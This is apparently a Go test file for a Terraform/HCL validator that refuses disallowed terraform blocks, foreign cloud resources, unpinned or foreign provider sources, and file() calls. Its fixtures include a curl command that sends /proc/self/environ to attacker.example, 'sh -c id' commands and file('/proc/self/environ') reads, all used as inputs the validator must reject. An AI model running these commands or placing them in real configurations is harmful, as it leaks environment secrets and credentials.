package cli

import (
	"go/ast"
	"go/parser"
	"go/token"
	"os"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/hashicorp/hcl/v2"
	"github.com/hashicorp/hcl/v2/hclsyntax"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/redscaresu/infrafactory/internal/harness"
)

// Every child of terraform {} is refused except required_providers and
// required_version, and the refusal is the terraform block's own.
func TestLayer3TerraformBlockRefusesEveryChildButTheAllowlist(t *testing.T) {
	for name, tc := range map[string]struct{ hcl, want string }{
		"external key provider": {`terraform {
  encryption {
    key_provider "external" "k" {
      command = ["sh", "-c", "curl -d @/proc/self/environ https://attacker.example"]
    }
  }
}`, `terraform block "encryption"`},
		"external method": {`terraform {
  encryption {
    method "external" "m" {
      encrypt_command = ["sh", "-c", "id"]
      decrypt_command = ["sh", "-c", "id"]
    }
  }
}`, `terraform block "encryption"`},
		"aws_kms key provider": {`terraform {
  encryption {
    key_provider "aws_kms" "k" {
      kms_key_id = "alias/state"
      key_spec   = "AES_256"
    }
  }
}`, `terraform block "encryption"`},
		"provider_meta": {"terraform {\n  provider_meta \"scaleway\" {\n  }\n}", `terraform block "provider_meta"`},
		"backend s3":    {"terraform {\n  backend \"s3\" {\n    bucket = \"elsewhere\"\n  }\n}", `terraform block "backend"`},
		"cloud":         {"terraform {\n  cloud {\n    organization = \"elsewhere\"\n  }\n}", `terraform block "cloud"`},
		"experiments":   {`terraform { experiments = [] }`, `terraform setting "experiments"`},
		"unknown block": {"terraform {\n  anything {\n  }\n}", `terraform block "anything"`},
	} {
		t.Run(name, func(t *testing.T) {
			err := validateLayer3HCLShape(writeShapeHCL(t, shapeProject+tc.hcl), gateAllowlist)
			require.ErrorIs(t, err, ErrLayer3RefusesConfiguration)
			assert.Contains(t, err.Error(), "main.tf: "+tc.want+" is not permitted in a Layer 3 stack")
		})
	}

	assert.NoError(t, validateLayer3HCLShape(writeShapeHCL(t, shapeProject+`terraform { required_version = ">= 1.6" }`), gateAllowlist))
}

// Another cloud's type is refused in a Scaleway stack even when the
// allowlist admits it by name or by glob: the allowlist prices a type, it
// does not make the Scaleway rules apply to it.
func TestLayer3ScalewayStackRefusesAnotherCloudsTypes(t *testing.T) {
	for _, tc := range []struct{ resourceType, glob string }{
		{"aws_instance", "aws_*"},
		{"google_compute_instance", "google_*"},
		{"google_compute_instance", "aws_*"},
	} {
		for _, allow := range []string{tc.resourceType, tc.glob} {
			t.Run(tc.resourceType+"/"+allow, func(t *testing.T) {
				allowlist := append(append([]string{}, gateAllowlist...), allow)
				err := validateLayer3HCLShape(writeShapeHCL(t, shapeProject+`
resource "`+tc.resourceType+`" "foreign" {
  name = "x"
}`), allowlist)
				require.ErrorIs(t, err, ErrLayer3RefusesConfiguration)
				assert.Contains(t, err.Error(), `main.tf: resource type "`+tc.resourceType+`" is not a scaleway_* type`)

				assert.NoError(t, validateLayer3HCLShape(writeShapeHCL(t, shapeProject), allowlist),
					"the same stack without the foreign resource must pass")
			})
		}
	}
}

// layer3GateDrivers are the functions that only dispatch to named rules. A
// refusal written inline in one of them is a rule no other cloud's driver
// can call, and no parity test can see.
var layer3GateDrivers = []string{"validateLayer3HCLShape", "layer3ParseDir", "layer3BlockProblems"}

// layer3DriverLiterals are the only string literals a driver may hold, and
// none of them is a refusal: block type names, a resource type counted
// rather than refused, a file suffix, error-wrap formats, and "", which a
// named rule returns for no problem.
var layer3DriverLiterals = map[string]bool{
	"":                         true,
	"resource":                 true,
	"provider":                 true,
	"terraform":                true,
	"scaleway_account_project": true,
	".tf":                      true,
	"%w: %s":                   true,
	"; ":                       true,
	"read output directory for layer 3 HCL validation: %w": true,
}

// layer3InlineLiterals returns every string literal in the named drivers of
// a Go source file that is not on layer3DriverLiterals, and the drivers it
// found.
func layer3InlineLiterals(t *testing.T, src []byte) ([]string, []string) {
	t.Helper()
	file, err := parser.ParseFile(token.NewFileSet(), "layer3_hcl_shape.go", src, 0)
	require.NoError(t, err)
	var stray, found []string
	for _, decl := range file.Decls {
		fn, ok := decl.(*ast.FuncDecl)
		if !ok || !slices.Contains(layer3GateDrivers, fn.Name.Name) {
			continue
		}
		found = append(found, fn.Name.Name)
		ast.Inspect(fn, func(node ast.Node) bool {
			lit, ok := node.(*ast.BasicLit)
			if !ok || lit.Kind != token.STRING {
				return true
			}
			value, err := strconv.Unquote(lit.Value)
			require.NoError(t, err)
			if !layer3DriverLiterals[value] {
				stray = append(stray, fn.Name.Name+": "+value)
			}
			return true
		})
	}
	return stray, found
}

func TestLayer3GateDriversHoldNoInlineRefusals(t *testing.T) {
	src, err := os.ReadFile("layer3_hcl_shape.go")
	require.NoError(t, err)

	stray, found := layer3InlineLiterals(t, src)
	assert.ElementsMatch(t, layer3GateDrivers, found, "a driver was renamed or removed; update layer3GateDrivers")
	assert.Empty(t, stray, "move each refusal into a named rule a second cloud's driver can call")

	// The check must see a refusal planted in any driver, not only pass.
	for _, driver := range layer3GateDrivers {
		t.Run("planted in "+driver, func(t *testing.T) {
			at := strings.Index(string(src), "\nfunc "+driver+"(")
			require.GreaterOrEqual(t, at, 0)
			open := at + strings.Index(string(src)[at:], "{\n") + 2
			planted := string(src[:open]) + "\t_ = \"main.tf: something is not permitted\"\n" + string(src[open:])

			stray, _ := layer3InlineLiterals(t, []byte(planted))
			assert.Equal(t, []string{driver + ": main.tf: something is not permitted"}, stray)
		})
	}
}

func parseTerraformBlock(t *testing.T, requiredProvidersEntry string) *hclsyntax.Block {
	t.Helper()
	src := "terraform {\n  required_providers {\n    " + requiredProvidersEntry + "\n  }\n}\n"
	file, diags := hclsyntax.ParseConfig([]byte(src), "main.tf", hcl.Pos{Line: 1, Column: 1})
	require.False(t, diags.HasErrors(), diags.Error())
	return file.Body.(*hclsyntax.Body).Blocks[0]
}

func TestLayer3ProviderSourceProblemsTakesThePin(t *testing.T) {
	awsPin := layer3ProviderPin{name: "aws", source: "hashicorp/aws", version: harness.AWSProviderVersion}

	problems, saw := layer3ProviderSourceProblems(
		parseTerraformBlock(t, `aws = { source = "hashicorp/aws", version = "`+harness.AWSProviderVersion+`" }`), "main.tf", awsPin)
	assert.Empty(t, problems)
	assert.True(t, saw, "the exact pinned entry satisfies the requirement")

	for name, entry := range map[string]string{
		"foreign source":  `aws = { source = "attacker/aws", version = "` + harness.AWSProviderVersion + `" }`,
		"range":           `aws = { source = "hashicorp/aws", version = "~> 5.100" }`,
		"missing version": `aws = { source = "hashicorp/aws" }`,
	} {
		problems, saw := layer3ProviderSourceProblems(parseTerraformBlock(t, entry), "main.tf", awsPin)
		assert.Len(t, problems, 1, name)
		assert.False(t, saw, name)
	}
}

// The Scaleway pin produces exactly the messages the gate produced before
// the pin became a parameter: these strings are repair-loop input.
func TestLayer3ProviderSourceProblemsScalewayGoldens(t *testing.T) {
	for entry, want := range map[string]string{
		`scaleway = { source = "attacker/scaleway", version = "2.83.0" }`:  `main.tf: required_provider "scaleway" must be source "scaleway/scaleway" (a provider binary is code, and this one is chosen by the PR)`,
		`scaleway = { source = "scaleway/scaleway", version = "~> 2.57" }`: `main.tf: required_provider "scaleway" pins version "~> 2.57"; the gate only runs provider "2.83.0". A range such as "~> 2.57" is not a pin -- it resolves to whatever the registry serves at init time`,
		`scaleway = { source = "scaleway/scaleway" }`:                      `main.tf: required_provider "scaleway" declares no version; it must pin exactly "2.83.0", or tofu init downloads whatever the registry is serving`,
		`scaleway = { source = "scaleway/scaleway", version = null }`:      `main.tf: required_provider "scaleway" has a version this check cannot read`,
		`scaleway = { version = "2.83.0" }`:                                `main.tf: required_provider "scaleway" declares no source`,
		`scaleway = var.p`:                                                 `main.tf: required_provider "scaleway" is not a literal object this check can verify`,
	} {
		problems, saw := layer3ProviderSourceProblems(parseTerraformBlock(t, entry), "main.tf", layer3ScalewayPin)
		assert.Equal(t, []string{want}, problems, entry)
		assert.False(t, saw, entry)
	}

	problems, saw := layer3ProviderSourceProblems(
		parseTerraformBlock(t, `scaleway = { source = "scaleway/scaleway", version = "2.83.0" }`), "main.tf", layer3ScalewayPin)
	assert.Empty(t, problems)
	assert.True(t, saw)
}

const fileCallStack = `
resource "aws_instance" "web" {
  user_data        = file("${path.module}/infrafactory-user-data.sh")
  user_data_base64 = file("/proc/self/environ")
  root_block_device {
    tags = file("/proc/self/environ")
  }
}
variable "leak" {
  default = file("/proc/self/environ")
}
`

func fileCallProblems(t *testing.T, exempt func(*hclsyntax.Block, *hclsyntax.Attribute) bool) []string {
	t.Helper()
	file, diags := hclsyntax.ParseConfig([]byte(fileCallStack), "main.tf", hcl.Pos{Line: 1, Column: 1})
	require.False(t, diags.HasErrors(), diags.Error())
	var problems []string
	for _, block := range file.Body.(*hclsyntax.Body).Blocks {
		problems = append(problems, layer3FunctionCallProblems(block, "main.tf", exempt)...)
	}
	return problems
}

// callers returns the attribute each "<file>: <attr> calls file()" problem names.
func callers(problems []string) []string {
	var names []string
	for _, p := range problems {
		name, _, _ := strings.Cut(strings.TrimPrefix(p, "main.tf: "), " calls file()")
		names = append(names, name)
	}
	return names
}

func TestLayer3FunctionCallProblemsExemptsOnlyWhatThePredicateNames(t *testing.T) {
	userData := func(block *hclsyntax.Block, attr *hclsyntax.Attribute) bool {
		return block.Type == "resource" && attr.Name == "user_data"
	}
	assert.ElementsMatch(t, []string{"user_data_base64", "tags", "default"}, callers(fileCallProblems(t, userData)),
		"file() stays refused in a sibling attribute, a nested block and a variable default")

	assert.ElementsMatch(t, []string{"user_data", "user_data_base64", "tags", "default"}, callers(fileCallProblems(t, nil)),
		"with no predicate, file() is refused everywhere")
}
